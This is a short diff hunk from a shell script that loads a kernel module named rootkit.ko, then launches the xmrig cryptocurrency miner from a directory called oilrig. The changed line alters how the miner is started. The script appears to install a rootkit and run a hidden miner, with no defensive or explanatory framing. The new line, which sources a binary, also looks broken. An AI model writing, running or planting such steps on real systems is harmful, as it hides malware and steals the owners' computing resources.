@@ -23,6 +23,6 @@ insmod rootkit.ko
 dmesg 
 echo "done loading module"
 cd oilrig 
-./xmrig 
+. "./xmrig"
 
 echo "done launching "
